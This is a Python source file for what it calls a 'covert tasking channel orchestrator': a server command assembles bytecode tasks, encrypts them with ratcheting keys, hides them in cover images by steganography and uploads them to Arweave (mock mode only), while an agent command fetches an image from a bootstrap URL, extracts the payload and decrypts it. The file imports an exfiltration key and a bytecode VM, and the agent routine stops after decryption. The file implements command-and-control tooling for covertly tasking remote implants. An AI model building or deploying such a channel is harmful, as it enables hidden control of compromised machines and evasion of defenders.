import logging
import os
import argparse
import requests

from PIL import Image
from io import BytesIO

#Configure logging before importing project modules
logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("forensic.log"),
        logging.StreamHandler(),
    ]
)
logger = logging.getLogger(__name__)

#Imports
from src.keys import (
    server_load_server_keys, server_derive_allkeys, server_save_server_keys,
    agent_load_agent_keys, agent_save_agent_keys,
    advance_ratchet, load_wallet
)

from src.assembler import OPCODE_TABLE, assemble_payload
from src.crypto_wrapper import encrypt_task, decrypt_task
from src.stego import embed, extract
from src.vm import execute_bytecode
from src.arweave_interface import MockArweave, download_image, get_wallet_transactions, get_latest_image_txid

#Creates the CLI using argparse
parser = argparse.ArgumentParser(prog="MAIN", description="Covert tasking channel orchestrator")
subparser = parser.add_subparsers(dest="Command")

#Server subcommand
server_parser = subparser.add_parser(name="server", description="Server commands", prog="MAIN")

server_parser.add_argument("--keyfile", required=True, help="Path to keyfile")
server_parser.add_argument("--task", required=True, help="Space separated assembly")
server_parser.add_argument("--cover", required=True, help="Path to the cover image")
server_parser.add_argument("--mock", action="store_true", help="Use mock Arweave instead of real network")

#Agent subcommand
agent_parser = subparser.add_parser(name="agent", description="Agent commands", prog="MAIN")

agent_parser.add_argument("--keyfile", required=True, help="Path to keyfile")
agent_parser.add_argument("--wallet", required=True, help="Path to arweave wallet file")
agent_parser.add_argument("--mock", action="store_true", help="Use mock Arweave instead of real network")

agent_group = agent_parser.add_mutually_exclusive_group(required=True)

agent_group.add_argument("--bootstrap-url", help="Bootstrap task fetch URL")
agent_group.add_argument("--watch", action="store_true", help="Poll server wallet for replies")

shared_state = {}

def run_server(args):
    #Load server keys from keyfile
    K_root = server_load_server_keys(args.keyfile)
    server_keys = server_derive_allkeys(K_root)

    K_ratchet = server_keys["K_ratchet"]
    K_extract = server_keys["K_extract"]

    #Splits args.task into valid bytecode instructions
    task_string = args.task
    task_tokens = task_string.split()

    lines = []
    current_instruction = []
    for token in task_tokens:

        if token in OPCODE_TABLE:
            if current_instruction:
                lines.append(" ".join(current_instruction))
            current_instruction = [token]
        else:
            current_instruction.append(token)

    if current_instruction:
        lines.append(" ".join(current_instruction))

    #Assembles the payload
    logger.info("Step A, Payload assembly start")
    bytecode = assemble_payload(lines)
    bytecode_length = len(bytecode)
    logger.info(f"Step A, bytecode length is {bytecode_length}")

    #Encrypts the task
    payload, new_ratchet = encrypt_task(bytecode, K_ratchet)
    payload_length = len(payload)
    logger.info(f"Step A, Payload length is {payload_length}")
    logger.info(f"Step A, Payload assembly finished")

    #Embeds the payload
    logger.info(f"Step B, Payload embedding start")
    stego_image = embed(args.cover, payload, K_extract)

    stego_dir = "src/temp"
    os.makedirs(stego_dir, exist_ok=True)
    stego_path = os.path.join(stego_dir, "stego.png")
    stego_image.save(stego_path)

    logger.info(f"Step B, Embedded image saved to {stego_path}")
    logger.info(f"Step B, Payload embedding finished")

    #Uploads the stego image
    logger.info(f"Step C, Image upload start")
    if args.mock:
        mock = MockArweave()
        txid = mock.upload_image("server_wallet", stego_path)
        logger.info(f"Step C, Image uploaded in transaction_id {txid}")
        logger.info(f"Step C, Image upload finished")
    else:
        raise NotImplementedError("Real Arweave upload not configured")

    #Stores shared state for the agent
    shared_state["txid"] = txid
    shared_state["new_ratchet"] = new_ratchet
    shared_state["mock"] = mock
    shared_state["K_extract"] = K_extract
    shared_state["K_ratchet"] = K_ratchet

def run_agent(args):
    #Load agent keys from keyfile
    agent_keys = agent_load_agent_keys(args.keyfile)

    K_ratchet = agent_keys["K_ratchet"]
    K_exfil_ratchet = agent_keys["K_exfil_ratchet"]
    K_Extract = agent_keys["K_extract"]

    #Download the bootstrap image
    logger.info("Step A, Bootstrap image download start")

    if args.mock:
        image_bytes = shared_state["mock"].download_image(shared_state["txid"]) 
        logger.info("Step A, Bootstrap image download Finished")
    else:
        image_bytes = requests.get(args.bootstrap_url, timeout=30).content
        logger.info("Step A, Bootstrap image download Finished")

    #Save downloaded bytes to a temp file
    logger.info("Step B, Bootstrap image stego extraction start")

    stego_stream = BytesIO(image_bytes)
    stego_image = Image.open(stego_stream)

    stego_dir = "src/temp"
    os.makedirs(stego_dir, exist_ok=True)
    stego_path = os.path.join(stego_dir, "stego.png")
    stego_image.save(stego_path)

    logger.info(f"Step B, Bootstap image saved to {stego_path}")

    #Extract the payload from the bootstrap image
    payload = extract(stego_path, K_Extract)
    logger.info(f"Step B, Bootstap image payload extracted")
    logger.info(f"Step B, Payload length {len(payload)}")
    logger.info("Step B, Bootstrap image stego extraction finished")

    #Decrypt the payload
    logger.info("Step C, Payload decryption start")
    payload_result = decrypt_task(payload, K_ratchet)

    if payload_result is None:
        logger.info("Step C, Payload decryption failed")
        logger.info("Step C, Payload decryption finished")
        return -1
    
    bytecode, agent_new_ratchet = payload_result
    logger.info("Step C, Payload decryption succesful")
    logger.info("Step C, Payload decryption finished")

    






    

    

    







#Parses args and dispatches
if __name__ == "__main__":
    args = parser.parse_args()

    if args.Command == "server":
        run_server(args)
    elif args.Command == "agent":
        run_agent(args)
    else:
        parser.print_help()
